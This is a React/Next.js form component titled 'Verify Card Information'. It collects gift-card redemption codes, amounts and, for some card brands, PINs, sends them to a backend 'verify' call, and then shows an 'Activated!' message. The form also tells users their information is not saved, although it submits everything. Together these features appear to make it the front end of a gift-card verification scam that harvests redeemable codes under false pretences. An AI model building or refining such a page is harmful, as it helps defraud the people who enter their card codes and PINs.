'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { useMutation, useQuery } from '@tanstack/react-query';
import { useRouter } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'sonner';
import { Loader2, Eye, EyeOff, ChevronDown } from 'lucide-react';
import { api } from '@/lib/api';

const schema = z.object({
  cardTypeId: z.string().min(1, 'Please select a card type'),
  currency: z.string().length(3, 'Select a currency'),
  amount: z.coerce.number().positive('Enter a valid amount').max(10000),
  cardCode: z.string().min(4, 'Card code is too short').max(64),
  pin: z.string().min(4).max(8).optional().or(z.literal('')),
});

type FormData = z.infer<typeof schema>;

const CURRENCIES = ['USD', 'EUR', 'GBP', 'CAD', 'AUD', 'JPY', 'CNY'];
const PIN_BRANDS = ['visa', 'mastercard', 'amex'];

export function VerificationForm() {
  const router = useRouter();
  const [showPin, setShowPin] = useState(false);
  const [successModalData, setSuccessModalData] = useState<{ currency: string, amount: number } | null>(null);

  const { data: cardTypes = [], isLoading: loadingTypes } = useQuery({
    queryKey: ['card-types'],
    queryFn: api.getCardTypes,
    staleTime: 5 * 60 * 1000,
  });

  const {
    register,
    handleSubmit,
    watch,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema as any),
    defaultValues: { currency: 'USD' },
  });

  const selectedTypeId = watch('cardTypeId');
  const selectedType = cardTypes.find((ct) => ct.id === selectedTypeId);
  const requiresPin = selectedType ? PIN_BRANDS.includes(selectedType.brand) : false;

  const { mutate: submitVerification, isPending } = useMutation({
    mutationFn: api.verify,
    onSuccess: (data, variables) => {
      setSuccessModalData({ currency: variables.currency, amount: variables.amount });
    },
    onError: (err: Error) => {
      toast.error(err.message || 'Verification failed. Please try again.');
    },
  });

  const onSubmit = (data: FormData) => {
    submitVerification({
      cardTypeId: data.cardTypeId,
      currency: data.currency,
      amount: data.amount,
      cardCode: data.cardCode,
      pin: data.pin || undefined,
    });
  };

  return (
    <div className="bg-[#0b162c] rounded-2xl p-8 border border-white/10 shadow-2xl w-full max-w-xl mx-auto">
      <div className="text-center mb-8">
        <h2 className="text-2xl font-bold text-white mb-2">Verify Card Information</h2>
      </div>

      <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
        <div>
          <label className="block text-sm font-medium text-gray-300 mb-2">
            Card Type <span className="text-red-400">*</span>
          </label>
          <div className="relative">
            <select
              {...register('cardTypeId')}
              className="w-full bg-white text-gray-900 border border-gray-300 rounded-lg px-4 py-3 pr-10 
                         text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 
                         transition-all appearance-none cursor-pointer"
              disabled={loadingTypes}
            >
              <option value="">
                {loadingTypes ? 'Loading...' : 'Select card type'}
              </option>
              {cardTypes.map((ct) => (
                <option key={ct.id} value={ct.id}>
                  {ct.name}
                </option>
              ))}
            </select>
            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none" />
          </div>
          {errors.cardTypeId && (
            <p className="text-xs text-red-400 mt-1">{errors.cardTypeId.message}</p>
          )}
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="block text-sm font-medium text-gray-300 mb-2">
              Currency <span className="text-red-400">*</span>
            </label>
            <div className="relative">
              <select
                {...register('currency')}
                className="w-full bg-white text-gray-900 border border-gray-300 rounded-lg px-4 py-3 pr-10 
                           text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 
                           transition-all appearance-none cursor-pointer"
              >
                {CURRENCIES.map((c) => (
                  <option key={c} value={c}>{c}</option>
                ))}
              </select>
              <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none" />
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-300 mb-2">
              Amount <span className="text-red-400">*</span>
            </label>
            <div className="relative">
              <input
                type="number"
                step="0.01"
                min="0.01"
                max="10000"
                {...register('amount')}
                placeholder="0.00"
                className="w-full bg-white text-gray-900 border border-gray-300 rounded-lg px-4 py-3 
                           text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all"
              />
            </div>
            {errors.amount && (
              <p className="text-xs text-red-400 mt-1">{errors.amount.message}</p>
            )}
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-300 mb-2">
            Redemption Code <span className="text-red-400">*</span>
          </label>
          <input
            type="text"
            {...register('cardCode')}
            placeholder="e.g. XXXX-XXXX-XXXX-XXXX"
            autoComplete="off"
            spellCheck={false}
            className="w-full bg-white text-gray-900 border border-gray-300 rounded-lg px-4 py-3 
                       text-sm font-mono tracking-wider focus:outline-none focus:ring-2 
                       focus:ring-blue-500 transition-all uppercase placeholder:uppercase placeholder:tracking-wider"
          />
          {errors.cardCode && (
            <p className="text-xs text-red-400 mt-1">{errors.cardCode.message}</p>
          )}
        </div>

        <AnimatePresence>
          {requiresPin && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              transition={{ duration: 0.2 }}
            >
              <label className="block text-sm font-medium text-gray-300 mb-2">
                PIN (Optional)
              </label>
              <div className="relative">
                <input
                  type={showPin ? 'text' : 'password'}
                  {...register('pin')}
                  placeholder="4-8 digits"
                  maxLength={8}
                  className="w-full bg-white text-gray-900 border border-gray-300 rounded-lg px-4 py-3 pr-12
                             text-sm font-mono focus:outline-none focus:ring-2 
                             focus:ring-blue-500 transition-all"
                />
                <button
                  type="button"
                  onClick={() => setShowPin(!showPin)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                >
                  {showPin ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        <p className="text-xs text-red-400/80 mt-4 leading-relaxed">
          *WARNING!! For your security, this system does not save your information
        </p>

        <button
          type="submit"
          disabled={isPending}
          id="verify-submit-btn"
          className="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-4 rounded-lg transition-colors mt-6 flex items-center justify-center gap-2"
        >
          {isPending ? (
            <>
              <Loader2 className="w-5 h-5 animate-spin" />
              Verifying...
            </>
          ) : (
            'Continue'
          )}
        </button>
      </form>

      {/* Success Modal */}
      <AnimatePresence>
        {successModalData && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="bg-white rounded-xl shadow-xl w-full max-w-sm overflow-hidden"
            >
              <div className="flex justify-end p-2">
                <button 
                  onClick={() => {
                    setSuccessModalData(null);
                    reset();
                  }}
                  className="text-blue-600 hover:bg-blue-50 rounded-lg p-1 transition-colors"
                >
                  <span className="sr-only">Close</span>
                  <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>
              <div className="px-6 pb-6 text-center">
                <p className="text-[#0a3182] font-medium text-lg mb-6 leading-snug">
                  Activated! Your {successModalData.currency}{successModalData.amount} card<br />has been successfully activated
                </p>
                <button
                  onClick={() => {
                    setSuccessModalData(null);
                    reset();
                  }}
                  className="bg-[#1257d1] hover:bg-blue-700 text-white font-medium py-2 px-8 rounded-lg transition-colors"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
